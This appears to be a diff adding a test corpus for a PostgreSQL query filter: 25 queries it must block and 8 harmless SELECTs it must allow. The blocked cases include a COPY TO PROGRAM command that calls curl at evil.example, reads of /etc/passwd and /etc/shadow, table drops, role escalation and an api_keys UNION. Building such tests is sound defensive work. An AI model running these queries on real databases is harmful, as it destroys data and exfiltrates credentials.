@@ -1,0 +1,37 @@
+# Корпус проверочных SQL-вызовов для диалекта PostgreSQL.
+# Профиль: dialect=postgres, allow_statements=[select], tables_allow=[customers, orders],
+# columns_deny={customers: [passport, card_number]}.
+- {id: PG01, expect: block, args: {query: "DROP TABLE customers"}}
+- {id: PG02, expect: block, args: {query: "TRUNCATE TABLE orders CASCADE"}}
+- {id: PG03, expect: block, args: {query: "DELETE FROM customers WHERE id = 1"}}
+- {id: PG04, expect: block, args: {query: "UPDATE customers SET balance = 0 WHERE id = 1"}}
+- {id: PG05, expect: block, args: {query: "COPY customers TO PROGRAM 'curl https://evil.example/'"}}
+- {id: PG06, expect: block, args: {query: "COPY (SELECT * FROM customers) TO '/tmp/dump.csv'"}}
+- {id: PG07, expect: block, args: {query: "SELECT pg_read_file('/etc/passwd')"}}
+- {id: PG08, expect: block, args: {query: "SELECT pg_read_binary_file('/etc/shadow')"}}
+- {id: PG09, expect: block, args: {query: "SELECT pg_ls_dir('/var/lib/postgresql')"}}
+- {id: PG10, expect: block, args: {query: "SELECT pg_sleep(5)"}}
+- {id: PG11, expect: block, args: {query: "SELECT pg_terminate_backend(1234)"}}
+- {id: PG12, expect: block, args: {query: "SELECT lo_import('/etc/passwd')"}}
+- {id: PG13, expect: block, args: {query: "SELECT lo_export(12345, '/tmp/out')"}}
+- {id: PG14, expect: block, args: {query: "SELECT dblink_exec('host=evil.example', 'DROP TABLE t')"}}
+- {id: PG15, expect: block, args: {query: "DO $$ BEGIN EXECUTE 'DROP TABLE customers'; END $$"}}
+- {id: PG16, expect: block, args: {query: "SELECT * INTO loot FROM customers"}}
+- {id: PG17, expect: block, args: {query: "SET ROLE postgres"}}
+- {id: PG18, expect: block, args: {query: "CREATE EXTENSION IF NOT EXISTS dblink"}}
+- {id: PG19, expect: block, args: {query: "LISTEN secret_channel"}}
+- {id: PG20, expect: block, args: {query: "SELECT * FROM pg_catalog.pg_shadow"}}
+- {id: PG21, expect: block, args: {query: "SELECT table_name FROM information_schema.tables"}}
+- {id: PG22, expect: block, args: {query: "WITH d AS (DELETE FROM orders RETURNING *) SELECT * FROM d"}}
+- {id: PG23, expect: block, args: {query: "SELECT name FROM customers UNION SELECT key FROM api_keys"}}
+- {id: PG24, expect: block, args: {query: "SELECT passport FROM customers WHERE id = 1"}}
+- {id: PG25, expect: block, args: {query: "SELECT * FROM customers"}}
+
+- {id: PGB01, expect: allow, args: {query: "SELECT id, name, city FROM customers WHERE id = 1 LIMIT 10"}}
+- {id: PGB02, expect: allow, args: {query: "SELECT o.id, o.amount, c.name FROM orders o JOIN customers c ON c.id = o.customer_id WHERE o.status = 'paid' LIMIT 20"}}
+- {id: PGB03, expect: allow, args: {query: "WITH tot AS (SELECT customer_id, SUM(amount) AS s FROM orders GROUP BY customer_id) SELECT c.name, tot.s FROM tot JOIN customers c ON c.id = tot.customer_id ORDER BY tot.s DESC LIMIT 5"}}
+- {id: PGB04, expect: allow, args: {query: "SELECT COUNT(*) FROM orders WHERE status <> 'cancelled'"}}
+- {id: PGB05, expect: allow, args: {query: "SELECT id, item FROM orders WHERE item = 'DROP TABLE customers; --' LIMIT 5"}}
+- {id: PGB06, expect: allow, args: {query: "SELECT id, name FROM customers WHERE city = 'Москва'"}}
+- {id: PGB07, expect: allow, args: {query: "SELECT COALESCE(city, 'нет') FROM customers LIMIT 20"}}
+- {id: PGB08, expect: allow, args: {query: "SELECT id FROM orders WHERE created_at >= '2026-11-01' ORDER BY id DESC LIMIT 15"}}
